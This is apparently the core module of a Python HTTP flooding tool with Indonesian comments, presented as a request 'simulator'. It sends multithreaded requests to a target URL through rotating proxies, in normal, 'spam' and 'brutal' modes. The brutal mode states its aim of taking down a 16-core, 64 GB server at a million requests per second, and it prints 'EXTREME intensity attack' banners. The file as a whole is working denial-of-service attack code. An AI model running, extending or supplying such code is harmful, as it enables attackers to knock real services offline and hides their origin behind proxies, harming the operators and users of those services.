import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from config import MAX_WORKERS, MIN_DELAY, SPAM_MODE_DELAY, SPAM_MAX_WORKERS, BRUTAL_MODE_DELAY, BRUTAL_MAX_WORKERS, BRUTAL_REQUESTS_PER_ITERATION, BRUTAL_CONCURRENT_CONNECTIONS, BRUTAL_ITERATIONS_PER_SECOND, BRUTAL_BATCH_SIZE
from simulator.worker import run_request

class SimulationResults:
    """Container untuk menyimpan results dengan thread-safe"""
    def __init__(self):
        self._results = []
        self._lock = threading.Lock()
    
    def append(self, result):
        with self._lock:
            self._results.append(result)
    
    def extend(self, results):
        with self._lock:
            self._results.extend(results)
    
    def get_all(self):
        with self._lock:
            return self._results.copy()
    
    def count(self):
        with self._lock:
            return len(self._results)

def get_proxy_display(proxies):
    """
    Format proxy list untuk display (hide credentials)
    Returns: string dengan informasi proxy
    """
    if not proxies:
        return "No proxy"
    
    if len(proxies) == 1 and proxies[0] is None:
        return "Direct (no proxy)"
    
    # Extract IP:PORT dari setiap proxy untuk display
    proxy_display = []
    for p in proxies:
        if p is None:
            proxy_display.append("Direct")
        elif '@' in p:
            # Format: http://user:pass@ip:port
            parts = p.split('@')
            if len(parts) == 2:
                proxy_display.append(parts[1])  # ip:port
            else:
                proxy_display.append(p.split('/')[-1])
        else:
            proxy_display.append(p.split('/')[-1])
    
    if len(proxy_display) <= 3:
        return f"{len(proxies)} proxy: {', '.join(proxy_display)}"
    else:
        return f"{len(proxies)} proxies: {', '.join(proxy_display[:3])}... (+{len(proxies)-3} more)"

def run_simulation(target, proxies, method=None, headers=None, data=None, background=False, duration=None, spam_mode=False, brutal_mode=False, requests_per_second=None, total_requests=None, num_threads=None):
    """
    Jalankan simulasi request dengan custom options
    
    Args:
        target: URL target
        proxies: List proxy atau [None] untuk tanpa proxy
        method: HTTP method
        headers: Custom headers
        data: Custom data untuk POST/PUT
        background: Jika True, jalankan di background thread
        duration: Durasi dalam detik (None = jalankan sekali)
        spam_mode: Jika True, mode spam tanpa delay
        brutal_mode: Jika True, mode brutal dengan intensitas maksimal
        requests_per_second: Target requests per detik (total untuk semua thread)
        total_requests: Total requests yang ingin dikirim (total untuk semua thread)
        num_threads: Jumlah thread yang akan digunakan
    """
    results = SimulationResults() if background else []
    
    # Gunakan num_threads jika diberikan, otherwise gunakan default
    if num_threads:
        workers = num_threads
    else:
        if brutal_mode:
            workers = BRUTAL_MAX_WORKERS
        elif spam_mode:
            workers = SPAM_MAX_WORKERS
        else:
            workers = MAX_WORKERS
    
    delay = BRUTAL_MODE_DELAY if brutal_mode else (SPAM_MODE_DELAY if spam_mode else MIN_DELAY)
    
    def _run_single_iteration():
        """Jalankan satu iterasi request dengan multiple threads - OPTIMIZED FOR 1M REQ/S"""
        iteration_results = []
        
        # Brutal mode: gunakan lebih banyak concurrent connections untuk handle load
        # Calculate total concurrent requests untuk brutal mode
        if brutal_mode:
            total_concurrent = workers * len(proxies) * BRUTAL_REQUESTS_PER_ITERATION
            # Limit max workers untuk ThreadPoolExecutor (sistem limit)
            # Untuk 1M req/s, kita butuh banyak threads, tapi tetap ada limit sistem
            max_pool_workers = min(total_concurrent, 10000)  # Max 10000 concurrent threads untuk 1M req/s
        else:
            max_pool_workers = workers
        
        # Buat multiple worker threads yang menjalankan request secara parallel
        with ThreadPoolExecutor(max_workers=max_pool_workers) as pool:
            all_futures = []
            
            # Brutal mode: multiple requests per proxy untuk maximum load (1M req/s target)
            if brutal_mode:
                # Untuk brutal mode: setiap worker mengirim multiple requests ke setiap proxy
                requests_per_proxy = BRUTAL_REQUESTS_PER_ITERATION
                
                # Batch processing untuk efisiensi
                batch_futures = []
                batch_count = 0
                
                for _ in range(workers):
                    for proxy in proxies:
                        # Kirim multiple requests secara parallel per proxy
                        for _ in range(requests_per_proxy):
                            future = pool.submit(run_request, target, proxy, method, headers, data, brutal_mode)
                            all_futures.append(future)
                            batch_futures.append(future)
                            batch_count += 1
                            
                            # Process batch jika sudah mencapai batch size
                            if batch_count >= BRUTAL_BATCH_SIZE:
                                # Submit batch dan reset
                                batch_futures = []
                                batch_count = 0
            else:
                # Normal/Spam mode: 1 request per proxy per worker
                for _ in range(workers):
                    for proxy in proxies:
                        future = pool.submit(run_request, target, proxy, method, headers, data, brutal_mode)
                        all_futures.append(future)
            
            # Collect results as they complete (don't wait for all in brutal mode)
            if brutal_mode:
                # Brutal mode: fire and forget - collect results as fast as possible
                # Untuk 1M req/s, kita tidak perlu menunggu semua results
                collected = 0
                for future in as_completed(all_futures):
                    try:
                        result = future.result(timeout=0.05)  # Ultra short timeout untuk 1M req/s
                        iteration_results.append(result)
                        collected += 1
                    except Exception as e:
                        iteration_results.append(("ERR", 0, str(e)))
                        collected += 1
                    
                    # Limit collection untuk performance (tidak perlu collect semua untuk statistik)
                    if collected >= len(all_futures) * 0.1:  # Collect 10% untuk statistik
                        break
            else:
                # Normal mode: wait for all results
                for future in as_completed(all_futures):
                    try:
                        result = future.result()
                        iteration_results.append(result)
                    except Exception as e:
                        iteration_results.append(("ERR", 0, str(e)))
            
            if delay > 0:
                time.sleep(delay)
        
        return iteration_results
    
    def _run_spam_mode():
        """Jalankan spam mode dengan rate control"""
        request_count = 0
        start_time = time.time()
        
        if requests_per_second:
            # Rate-based spam (requests_per_second sudah total untuk semua thread)
            interval = 1.0 / requests_per_second
            while True:
                if total_requests and request_count >= total_requests:
                    break
                if duration and (time.time() - start_time) >= duration:
                    break
                
                iteration_results = _run_single_iteration()
                if background:
                    results.extend(iteration_results)
                else:
                    results.extend(iteration_results)
                request_count += len(iteration_results)
                
                # Rate limiting - tunggu jika rate terlalu tinggi
                elapsed = time.time() - start_time
                if elapsed > 0:
                    current_rate = request_count / elapsed
                    if current_rate >= requests_per_second:
                        # Sleep sedikit untuk rate limiting
                        time.sleep(interval)
        
        elif total_requests:
            # Total request-based spam
            while request_count < total_requests:
                if duration and (time.time() - start_time) >= duration:
                    break
                
                iteration_results = _run_single_iteration()
                if background:
                    results.extend(iteration_results)
                else:
                    results.extend(iteration_results)
                request_count += len(iteration_results)
        
        else:
            # Unlimited spam selama duration
            while True:
                if duration and (time.time() - start_time) >= duration:
                    break
                
                iteration_results = _run_single_iteration()
                if background:
                    results.extend(iteration_results)
                else:
                    results.extend(iteration_results)
                request_count += len(iteration_results)
        
        return request_count
    
    def _run_brutal_mode():
        """Jalankan brutal mode - EXTREME intensity untuk down VPS 16 Core / 64GB RAM"""
        request_count = 0
        start_time = time.time()
        last_update_time = start_time
        
        requests_per_iter = workers * len(proxies) * BRUTAL_REQUESTS_PER_ITERATION
        estimated_rps = requests_per_iter * BRUTAL_ITERATIONS_PER_SECOND
        
        print(f"[*] BRUTAL MODE: EXTREME intensity attack - TARGET: 1 MILLION REQ/S!")
        print(f"[*] Target: VPS 16 Core / 64GB RAM")
        print(f"[*] Workers: {workers:,}")
        print(f"[*] Proxies: {len(proxies)}")
        print(f"[*] Requests per proxy per iteration: {BRUTAL_REQUESTS_PER_ITERATION}")
        print(f"[*] Iterations per second: {BRUTAL_ITERATIONS_PER_SECOND}")
        print(f"[*] Batch size: {BRUTAL_BATCH_SIZE}")
        print(f"[*] Estimated requests per iteration: {requests_per_iter:,}")
        print(f"[*] Estimated peak rate: {estimated_rps:,} req/s")
        print(f"[*] TARGET: 1,000,000 req/s")
        print(f"[*] WARNING: This will generate EXTREME load!")
        print()
        
        iteration = 0
        target_iteration_time = 1.0 / BRUTAL_ITERATIONS_PER_SECOND if BRUTAL_ITERATIONS_PER_SECOND > 0 else 0
        
        while True:
            if duration and (time.time() - start_time) >= duration:
                break
            if total_requests and request_count >= total_requests:
                break
            
            iteration += 1
            iteration_start = time.time()
            
            # Brutal mode: jalankan multiple iterations dalam satu detik
            iterations_this_second = 0
            while True:
                # Jalankan satu iteration
                iteration_results = _run_single_iteration()
                if background:
                    results.extend(iteration_results)
                else:
                    results.extend(iteration_results)
                request_count += len(iteration_results)
                iterations_this_second += 1
                
                # Check jika sudah mencapai target iterations per second
                if BRUTAL_ITERATIONS_PER_SECOND > 0:
                    elapsed_this_second = time.time() - iteration_start
                    if elapsed_this_second >= 1.0 or iterations_this_second >= BRUTAL_ITERATIONS_PER_SECOND:
                        break
                else:
                    # Jika BRUTAL_ITERATIONS_PER_SECOND = 0, jalankan sekali saja
                    break
                
                # Check duration/requests limit
                if duration and (time.time() - start_time) >= duration:
                    break
                if total_requests and request_count >= total_requests:
                    break
            
            # Progress update setiap detik atau setiap 10 iterations
            elapsed = time.time() - start_time
            if elapsed - (last_update_time - start_time) >= 1.0 or iteration % 10 == 0:
                rate = request_count / elapsed if elapsed > 0 else 0
                
                # Calculate total bytes
                total_bytes = 0
                if isinstance(results, list):
                    total_bytes = sum([r[2] for r in results if isinstance(r, (tuple, list)) and len(r) > 2 and isinstance(r[2], int)])
                elif hasattr(results, 'get_all'):
                    all_results = results.get_all()
                    total_bytes = sum([r[2] for r in all_results if isinstance(r, (tuple, list)) and len(r) > 2 and isinstance(r[2], int)])
                
                from simulator.metrics import format_bytes
                bytes_formatted = format_bytes(total_bytes)
                
                print(f"[BRUTAL] Iter: {iteration} | Requests: {request_count:,} | Rate: {rate:.0f} req/s | Data: {bytes_formatted} | Elapsed: {elapsed:.1f}s")
                last_update_time = time.time()
        
        return request_count
    
    if background:
        # Jalankan di background thread
        stop_flag = threading.Event()
        
        def background_worker():
            start_time = time.time()
            iteration = 0
            
            if brutal_mode:
                _run_brutal_mode()
            elif spam_mode:
                _run_spam_mode()
            else:
                while not stop_flag.is_set():
                    if duration and (time.time() - start_time) >= duration:
                        break
                    
                    iteration += 1
                    iteration_results = _run_single_iteration()
                    results.extend(iteration_results)
                    
                    if iteration % 10 == 0:
                        count = results.count()
                        elapsed = time.time() - start_time
                        rate = count / elapsed if elapsed > 0 else 0
                        proxy_info = get_proxy_display(proxies)
                        print(f"[*] Background: {count} requests | Rate: {rate:.1f} req/s | Proxy: {proxy_info} | Elapsed: {elapsed:.1f}s")
            
            count = results.count()
            elapsed = time.time() - start_time
            final_rate = count / elapsed if elapsed > 0 else 0
            proxy_info = get_proxy_display(proxies)
            print(f"\n[✓] Background simulation completed. Total: {count} requests | Rate: {final_rate:.1f} req/s | Proxy: {proxy_info} | Duration: {elapsed:.1f}s")
        
        thread = threading.Thread(target=background_worker, daemon=True)
        thread.start()
        
        if brutal_mode:
            mode_str = "BRUTAL MODE"
        elif spam_mode:
            mode_str = "SPAM MODE"
        else:
            mode_str = "Normal"
        proxy_info = get_proxy_display(proxies)
        print(f"[*] Simulation running in background thread ({mode_str})...")
        print(f"[*] Proxy: {proxy_info}")
        if duration:
            print(f"[*] Duration: {duration} seconds")
        if brutal_mode:
            print(f"[*] WARNING: Maximum intensity attack!")
            if total_requests:
                print(f"[*] Target total: {total_requests} requests")
        elif spam_mode:
            if requests_per_second:
                print(f"[*] Target rate: {requests_per_second} requests/second")
            if total_requests:
                print(f"[*] Target total: {total_requests} requests")
        print("[*] Use Ctrl+C to stop")
        
        # Return thread object dan results container
        return thread, results, stop_flag
    else:
        # Jalankan normal (blocking)
        if brutal_mode:
            print(f"[*] Running in BRUTAL MODE...")
            print(f"[*] Proxy: {get_proxy_display(proxies)}")
            print(f"[*] WARNING: Maximum intensity - use responsibly!")
            if duration:
                print(f"[*] Duration: {duration} seconds")
            if total_requests:
                print(f"[*] Target total: {total_requests} requests")
            
            start_time = time.time()
            _run_brutal_mode()
            elapsed = time.time() - start_time
            
            count = len(results) if isinstance(results, list) else results.count()
            rate = count / elapsed if elapsed > 0 else 0
            proxy_info = get_proxy_display(proxies)
            print(f"\n[✓] Brutal mode completed. Total: {count} requests | Rate: {rate:.0f} req/s | Proxy: {proxy_info} | Duration: {elapsed:.1f}s")
        elif spam_mode:
            proxy_info = get_proxy_display(proxies)
            print(f"[*] Running in SPAM MODE...")
            print(f"[*] Proxy: {proxy_info}")
            if requests_per_second:
                print(f"[*] Target rate: {requests_per_second} requests/second")
            if total_requests:
                print(f"[*] Target total: {total_requests} requests")
            if duration:
                print(f"[*] Duration: {duration} seconds")
            
            start_time = time.time()
            _run_spam_mode()
            elapsed = time.time() - start_time
            
            count = len(results) if isinstance(results, list) else results.count()
            rate = count / elapsed if elapsed > 0 else 0
            proxy_info = get_proxy_display(proxies)
            print(f"\n[✓] Spam mode completed. Total: {count} requests | Rate: {rate:.1f} req/s | Proxy: {proxy_info} | Duration: {elapsed:.1f}s")
        elif duration:
            # Jalankan berulang selama duration
            start_time = time.time()
            iteration = 0
            while (time.time() - start_time) < duration:
                iteration += 1
                iteration_results = _run_single_iteration()
                results.extend(iteration_results)
                elapsed = time.time() - start_time
                rate = len(results) / elapsed if elapsed > 0 else 0
                proxy_info = get_proxy_display(proxies)
                print(f"[*] Iteration {iteration}: {len(results)} requests | Rate: {rate:.1f} req/s | Proxy: {proxy_info} | Elapsed: {elapsed:.1f}s")
        else:
            # Jalankan sekali
            results = _run_single_iteration()
        
        return None, results, None
